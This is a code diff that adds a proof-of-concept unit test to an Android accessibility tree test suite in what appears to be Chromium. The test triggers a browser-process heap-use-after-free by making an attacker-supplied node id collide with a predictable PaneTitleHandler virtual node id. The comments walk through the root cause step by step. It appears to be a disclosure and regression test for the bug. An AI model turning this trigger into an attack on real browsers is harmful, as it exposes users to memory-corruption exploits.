@@ -1700,4 +1700,87 @@ TEST_F(AXTreeSourceAndroidTest, UpdateChangeFromNameMergedNode) {
   EXPECT_EQ("text2", name);
 }
 
+// POC: Browser-process heap-use-after-free via PaneTitleHandler virtual_node_id
+// collision. Event A installs a PaneTitleHandler whose virtual_node_id_ is
+// taken from a predictable static counter (1'000'000'000). On a later event
+// with the same window_id, an attacker-supplied node with id ==
+// virtual_node_id_ is inserted into tree_map_ by BuildNodeMap; source_node is
+// captured as a raw pointer to that wrapper; then
+// PaneTitleHandler::PreDispatchEvent calls SetVirtualNode which overwrites
+// tree_map_[virtual_node_id_] and frees the wrapper. The dangling source_node
+// is then dereferenced via virtual call in ToAXEvent (and again in
+// GetFirstAccessibilityFocusableAncestor when full focus mode is on).
+//
+// Run with:
+// --gtest_filter=AXTreeSourceAndroidTest.PaneTitleVirtualNodeIdCollisionUAF
+// to ensure the static counter starts at 1'000'000'000.
+TEST_F(AXTreeSourceAndroidTest, PaneTitleVirtualNodeIdCollisionUAF) {
+  constexpr int32_t kWindowId = 100;
+  constexpr int32_t kRootNodeId = 10;
+  constexpr int32_t kEventWindowId = 555;
+  constexpr int32_t kVirtualId = 1'000'000'000;  // matches static counter init
+
+  // === Event A: install a PaneTitleHandler (virtual_node_id_ = 1e9). ===
+  auto event_a = AXEventData::New();
+  event_a->task_id = 1;
+  event_a->window_id = kEventWindowId;
+  event_a->event_type = AXEventType::WINDOW_STATE_CHANGED;
+  event_a->source_id = kRootNodeId;
+  SetProperty(event_a.get(), AXEventIntListProperty::CONTENT_CHANGE_TYPES,
+              {static_cast<int>(mojom::ContentChangeType::PANE_APPEARED)});
+
+  event_a->window_data = std::vector<mojom::AccessibilityWindowInfoDataPtr>();
+  event_a->window_data->push_back(AXWindowInfoData::New());
+  AXWindowInfoData* win_a = event_a->window_data->back().get();
+  win_a->window_id = kWindowId;
+  win_a->root_node_id = kRootNodeId;
+  // Intentionally do NOT set FOCUSED so UpdateAndroidFocusedId early-returns.
+
+  event_a->node_data.push_back(AXNodeInfoData::New());
+  AXNodeInfoData* root_a = event_a->node_data.back().get();
+  root_a->id = kRootNodeId;
+  root_a->window_id = kWindowId;
+  SetProperty(root_a, AXBooleanProperty::IMPORTANCE, true);
+  SetProperty(root_a, AXStringProperty::PANE_TITLE, std::string("pane"));
+
+  CallNotifyAccessibilityEvent(event_a.get());
+
+  // === Event C: same window_id, includes a node whose id collides with the
+  //     handler's virtual_node_id_. source_id points at that node. ===
+  auto event_c = AXEventData::New();
+  event_c->task_id = 1;
+  event_c->window_id = kEventWindowId;  // hooks_ preserved
+  event_c->event_type = AXEventType::WINDOW_CONTENT_CHANGED;
+  event_c->source_id = kVirtualId;
+
+  event_c->window_data = std::vector<mojom::AccessibilityWindowInfoDataPtr>();
+  event_c->window_data->push_back(AXWindowInfoData::New());
+  AXWindowInfoData* win_c = event_c->window_data->back().get();
+  win_c->window_id = kWindowId;
+  win_c->root_node_id = kRootNodeId;
+
+  event_c->node_data.push_back(AXNodeInfoData::New());
+  AXNodeInfoData* root_c = event_c->node_data.back().get();
+  root_c->id = kRootNodeId;
+  root_c->window_id = kWindowId;
+  SetProperty(root_c, AXBooleanProperty::IMPORTANCE, true);
+  // Keep PANE_TITLE so PaneTitleHandler::ShouldDestroy() is false.
+  SetProperty(root_c, AXStringProperty::PANE_TITLE, std::string("pane"));
+  SetProperty(root_c, AXIntListProperty::CHILD_NODE_IDS,
+              std::vector<int>({kVirtualId}));
+
+  // The colliding "victim" node. After BuildNodeMap, source_node points here.
+  // PaneTitleHandler::PreDispatchEvent -> SetVirtualNode overwrites
+  // tree_map_[kVirtualId], freeing this wrapper while source_node dangles.
+  event_c->node_data.push_back(AXNodeInfoData::New());
+  AXNodeInfoData* victim = event_c->node_data.back().get();
+  victim->id = kVirtualId;
+  victim->window_id = kWindowId;
+  SetProperty(victim, AXIntProperty::LIVE_REGION, 1);
+
+  // Triggers heap-use-after-free: ToAXEvent(WINDOW_CONTENT_CHANGED, ...)
+  // performs source_node->GetNode(), a virtual call on the freed wrapper.
+  CallNotifyAccessibilityEvent(event_c.get());
+}
+
 }  // namespace ax::android
